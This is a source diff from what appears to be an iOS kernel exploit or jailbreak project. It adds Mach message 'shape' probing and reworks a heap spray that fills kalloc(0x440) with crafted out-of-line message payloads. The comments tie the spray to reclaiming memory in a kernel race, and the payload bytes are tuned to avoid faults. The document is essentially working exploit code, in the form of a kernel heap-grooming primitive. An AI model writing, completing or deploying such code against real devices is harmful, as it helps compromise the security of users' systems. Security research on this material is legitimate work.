@@ -992,6 +992,81 @@ static void rs_jr_freeSprayPorts(void) {
     rs_jr_nports = 0;
 }
 
+// One send attempt in a given shape; returns the raw kr so the caller can log
+// exactly which shape this kernel accepts.  The device run proved that the
+// PoC's shape (OOL + MACH_MSGH_BITS(MAKE_SEND,0) + a zero timeout) fails with
+// MACH_SEND_TIMED_OUT on the VERY FIRST send, i.e. before any queue limit is
+// relevant - so the shape itself, not the port pool, is the problem.
+//   variant 0: OOL, MAKE_SEND   (the PoC's exact call)
+//   variant 1: OOL, COPY_SEND
+//   variant 2: OOL, MOVE_SEND_ONCE
+//   variant 3: one INLINE message of exactly `size` bytes (no descriptors)
+static kern_return_t rs_jr_sendShape(mach_port_t port, uint8_t *payload,
+                                     uint32_t size, int variant, int blocking) {
+    mach_msg_option_t opt = blocking ? MACH_SEND_MSG
+                                     : (mach_msg_option_t)(MACH_SEND_MSG | MACH_SEND_TIMEOUT);
+    if (variant < 3) {
+        struct {
+            mach_msg_header_t          header;
+            mach_msg_body_t            body;
+            mach_msg_ool_descriptor_t  ool;
+        } msg;
+        memset(&msg, 0, sizeof msg);
+        mach_msg_type_name_t disp = MACH_MSG_TYPE_MAKE_SEND;
+        if (variant == 1) disp = MACH_MSG_TYPE_COPY_SEND;
+        if (variant == 2) disp = MACH_MSG_TYPE_MOVE_SEND_ONCE;
+        msg.header.msgh_bits = MACH_MSGH_BITS(disp, 0) | MACH_MSGH_BITS_COMPLEX;
+        msg.header.msgh_size = sizeof(msg);
+        msg.header.msgh_remote_port = port;
+        msg.body.msgh_descriptor_count = 1;
+        msg.ool.address = payload;
+        msg.ool.size = size;
+        msg.ool.deallocate = FALSE;
+        msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
+        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+        return mach_msg(&msg.header, opt, sizeof(msg), 0,
+                        MACH_PORT_NULL, 0, MACH_PORT_NULL);
+    }
+    uint8_t *buf = (uint8_t *)malloc(size);
+    if (!buf) return (kern_return_t)0x10000002;
+    memset(buf, 0, size);
+    mach_msg_header_t *h = (mach_msg_header_t *)buf;
+    h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+    h->msgh_size = size;
+    h->msgh_remote_port = port;
+    memcpy(buf + sizeof(mach_msg_header_t),
+           payload + sizeof(mach_msg_header_t),
+           size - sizeof(mach_msg_header_t));
+    kern_return_t kr = mach_msg(h, opt, size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+    free(buf);
+    return kr;
+}
+
+// Probe every shape once on fresh ports and log the kr.  Returns the first
+// variant the kernel accepts, or -1 if none work.
+static int rs_jr_probeShapes(uint8_t *payload, uint32_t size) {
+    int best = -1;
+    for (int v = 0; v < 4; v++) {
+        mach_port_t p = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) {
+            AveLog(S(@"[jpeg440]   shape%d: probe port alloc FAILED", v));
+            continue;
+        }
+        mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+        kern_return_t kr = rs_jr_sendShape(p, payload, size, v, 1);
+        const char *nm = (v == 0) ? "OOL MAKE_SEND" : (v == 1) ? "OOL COPY_SEND"
+                        : (v == 2) ? "OOL MOVE_SEND_ONCE" : "inline 0x440 COPY_SEND";
+        AveLog(S(@"[jpeg440]   shape%d %s: kr=%#x %@", v, nm, kr,
+                 kr == KERN_SUCCESS ? @"<== WORKS" : @""));
+        if (kr == KERN_SUCCESS && best < 0) best = v;
+        mach_port_destroy(mach_task_self(), p);
+    }
+    return best;
+}
+
+// Non-blocking send in the working shape; when a port's queue is full, receive
+// (and discard) one message from it to free a slot and retry once.  That also
+// keeps kalloc(0x440) churning, which is what a race reclaim needs.
 static int rs_jr_sprayOOL(int count, int safeMode) {
     if (rs_jr_nports <= 0) return 0;
     const uint32_t size = 0x440;
@@ -1007,35 +1082,32 @@ static int rs_jr_sprayOOL(int count, int safeMode) {
     }
     memset(payload + 128, 0, 8);   // request+128 self-ptr = NULL -> no deref
     payload[784] = 0;              // request+784 flags   = 0    -> no fault
-    int sent = 0;
+
+    static int shape = -2;          // -2 = not probed yet
+    if (shape == -2) {
+        shape = rs_jr_probeShapes(payload, size);
+        AveLog(S(@"[jpeg440] working send shape: %d", shape));
+    }
+    if (shape < 0) { free(payload); return 0; }
+
+    int sent = 0, drained = 0;
     kern_return_t firstFail = 0;
-    int fails = 0;
-    for (int i = 0; i < count && fails < rs_jr_nports; i++) {
+    for (int i = 0; i < count; i++) {
         mach_port_t port = rs_jr_ports[i % rs_jr_nports];
-        struct {
-            mach_msg_header_t          header;
-            mach_msg_body_t            body;
-            mach_msg_ool_descriptor_t  ool;
-        } msg;
-        memset(&msg, 0, sizeof msg);
-        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0)
-                             | MACH_MSGH_BITS_COMPLEX;
-        msg.header.msgh_size = sizeof(msg);
-        msg.header.msgh_remote_port = port;
-        msg.body.msgh_descriptor_count = 1;
-        msg.ool.address = payload;
-        msg.ool.size = size;
-        msg.ool.deallocate = FALSE;
-        msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
-        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
-        kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
-                                    sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
-        if (kr != KERN_SUCCESS) { if (!firstFail) firstFail = kr; fails++; continue; }
+        kern_return_t kr = rs_jr_sendShape(port, payload, size, shape, 0);
+        if (kr == (kern_return_t)0x10000004) {          // MACH_SEND_TIMED_OUT
+            uint8_t buf[0x600];
+            mach_msg_header_t *rh = (mach_msg_header_t *)buf;
+            if (mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(buf),
+                         port, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) drained++;
+            kr = rs_jr_sendShape(port, payload, size, shape, 0);
+        }
+        if (kr != KERN_SUCCESS) { if (!firstFail) firstFail = kr; break; }
         sent++;
     }
-    if (firstFail)
-        AveLog(S(@"[jpeg440]   spray sent=%d, first failure kr=%#x (port queue limit 5 per port, %d ports)",
-                 sent, firstFail, rs_jr_nports));
+    if (firstFail || sent < count)
+        AveLog(S(@"[jpeg440]   spray sent=%d drained=%d firstFail=%#x shape=%d ports=%d",
+                 sent, drained, firstFail, shape, rs_jr_nports));
     free(payload);
     return sent;
 }
